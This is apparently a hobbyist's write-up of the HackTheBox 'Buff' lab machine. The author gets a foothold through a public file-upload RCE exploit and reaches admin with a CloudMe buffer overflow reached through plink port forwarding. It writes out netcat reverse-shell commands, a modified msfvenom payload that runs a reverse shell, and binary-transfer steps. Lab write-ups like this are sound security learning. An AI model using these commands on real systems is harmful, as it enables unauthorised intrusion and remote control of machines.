Have you ever wondered about how life would be so much simpler and easier if something turned out like how it actually looked? Well This box taught me life lessons. I am currently a script-kiddie on hackthebox and solve pretty much only easy boxes. So while I was browsing through boxes, one of them grabbed my attention and it's name shall be Buff. Buff was the easiest box currently in the active machines but it was a windows box so I thought well this should work as good refresher since most of my owned boxes were linux till now. Spoiler alert: This box was able to annoy me from the starting till the end.

Starting with initial nmap scan

{%highlight bash%}
nmap -T4 10.10.10.198

Starting Nmap 7.60 ( https://nmap.org ) at 2020-08-24 22:09 IST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 2.14 seconds
{%endhighlight%}

thats.. wierd.. Well lets try -Pn flag which skips th check if host is alive or not as recommended by nmap. And again I didn't get anything back. So does this machine not have any important ports open at all? I try mix match of different flags and got nothing back. Okay that's annoying... after some time I just decided to start nmap for all 65535 ports. I rarely do this because It takes well over half an hour for this scan to complete and only do this in the time when I am probing the important ports. I come back and I am surprised with

{% highlight bash%}
nmap -p1000-65535 -T4 -Pn 10.10.10.198

Starting Nmap 7.60 ( https://nmap.org ) at 2020-08-24 22:11 IST
Nmap scan report for 10.10.10.198
Host is up (0.59s latency).

{%endhighlight%}

Alright that is some progress. Note to future me: scan for higher ports too dumbass. Now we have something to work with lets browse to the webpage.

Alright I see a login form on upper right and after I browse around a bit more I see 

<img src="/images/buff/about.png" />

So now we have the software and it's version and considering the fact that the machines stats showed that there are alot of cves in this machine I am going to bet there is a an exploit for this software. And it is literally the first thing that pops up in google. Would you look at that! It is an **Unauthenticated Remote Code Execution** if that is not every hacker's dream then I don't know what is. [Take a look](https://www.exploit-db.com/exploits/48506)

So I download the exploit and start reading. This exploit has a really nice explaination at the start too I recommend reading it. From what I gather this is what it does:

Take advantage of the fact that the software does not have proper access controls and we can upload any image type file. When uploading image file we can include php code inside it and save it with double extensions such as .php.jpg and this is able to by pass the extension check on the server side. When we have successfully uploaded the file we can just browse to it and run commands via a get parameter. Other than that its just some fancy banners and colouring in the script which I must say is pretty cool.

so now we run the script with target url as parameter

<img src="/images/buff/boku.png" />

Now we need to upgrade our shell because moving around in this one is something I don't intend to do. So we transfer the netcat binary for a reverse shell. [Find it here](https://github.com/int0x33/nc.exe?files=1). So I start python server with command `python3 -m http.server 5555` and now onto the victim machine we download these files with `http://YourIPAddress:5555/nc.exe -o nc.exe`

{%highlight bash%}
nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 10.10.10.198 57228 received!
Microsoft Windows [Version 10.0.17134.1610]

C:\xampp\htdocs\gym\upload>

{%endhighlight%}

and start a netcat listener on your machine with `nc -lvp 1234` then `C:\xampp\htdocs\gym\upload\nc.exe yourIP 1234 -e cmd.exe` on the attacking machine. You should have a command prompt now.

And we are already user shaun which means we can try and get the user flag. Fair enough we found the users.txt in the Desktop of shaun. Easiest user flag I have ever seen, I bet the root flag whould be easy too(**WRONG!**).

So now we just start look around for interesting files. I find some juicy stuuf like passwords.txt containing
{%highlight bash%}
C:\xampp>type passwords.txt
type passwords.txt
\### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV:

{%endhighlight%}

Soo juicy right? Well don't get your hopes up. That is about all I could find in xampp folder, heading on over to user folder I find an executable named CloudMe_1112.exe hm... When I run it nothing happens hmmm...... I thought that if this is in the Users directory then it must be something so I just search CloudMe and find and exploit for CloudMe v 1.11.2 (*so that's what that was*) and on the top of that it was a BUFF-er overflow (and that is where the machine's name come from). [Inspecting the poc](https://www.exploit-db.com/exploits/48389)  we see that it is an python script but I looked around and don't find an installation of python anywhere in the machine. 

I tried converting the python script to an .exe format using pyinstaller and py2exe but soon found that I need a windows os to perform those actions. I am a lazy bum and I refuse to shut down all my processes and dual boot into the windows 10 that I have on hand. No I'd rather find another way to run python scripts without a python installation.

I was officially stuck at this point. Heading on over to htb forums I see words such as "forward", "pl***.exe", "tunnel" and running python without having python, and I was able to quickly figure out that I need to use ssh tunneling and plink to perform remote port forwarding. hahahaha that lie is so ridiculous that I am cracking up even while writing this. No I was not able to figure out anything at all. I searched those keywords on google and landed on that conclusion. Even then I didn't have slightest idea of what to so because I had so many questions like how do I do this since windows don't have ssh?, What even is port forwarding? Do I need to use remote port forwarding or local port forwarding? To be or not to be? And many more...


Answers I got were:
- Ssh tunneling/port forwarding is when we can "forward" the data that one port is receiving to another port either on the same or remote machine.
- pPlink can be used as a substitute for ssh when working on windows
- We are going to use remote port forwarding rather than local port forwarding because:
1. The service CloudMe uses is not available to anything other than localhost so we need a way to access it remotely.
2. Since the machine doesn't have python we will forward all the data from the ports our attacking machine to the ports on victim machine that our script produces. That way we can run python without having python. (which is pretty cool if you ask me)

Here is the bunch of steps I had to perform to get the root flag:

- First of all we need to get some binaries onto the machine. Using the previous methods we transfer a plink.exe binary along with another copy of netcat binary renamed as something like nc1.exe (we will use it in future)

- Remember that exploit we downloaded and it has some payload with a msfvenom command above it? Yes that is the payload that we need to send to CLoudMe service. 

<img src="/images/buff/replace.png" />

we will need to change it to the the payload that we want. So to do that we copy the msfvenom command and we the change the CMD flag with the command we want to execute. So replace `CMD=calc.exe` to `CMD='C:\xampp\htdocs\gym\upload\nc1.exe yourIP 2222 -e cmd.exe'` and copy and replace the payload with ours.

- Next is start the ssh service on your system  with `sudo service ssh start`. 
- Now we finally use the final piece of the puzzle i.e plink. We use the command 

`plink.exe -v -x -a -T -C -noagent -ssh -R 8888:127.0.0.1:8888 YourUserName@yourIP`

This will make a ssh connection to your ssh server. I got this command from [here](https://dev.to/cambiph/setting-up-an-ssh-tunnel-using-plink-4om7) with a few modifications such as we replace -L with -R (for remote) and we also change the port number to both 8888 as this the port where our python script is sending the data as well as port where the CLoudMe service is running.

- Oh I forgot but you also need to start another netcat listener on port 2222 because when our msfvenom payload is executed it will send a reverse shell to that port. 

- And all that is left is run the python exploit script and you should see messages in the ssh tunnel about port forwarding and then receive a shell as administrator. (If not then maybe try to run the script again a few times)

I am going to be honest but I was only able to make this exploit work once and my dumb brain thought well you were able to do it once you can probably do it again. Turns out no I wasn't able to since this exploit has so many steps in it that the chances of mistakes are very high. And that is the reason you don't see many screenshots.

*wheww...* That was a lot of work and a lot of learning. I did not expect an easy level machine to teach me this much. I really am feeling a bit BUFF.
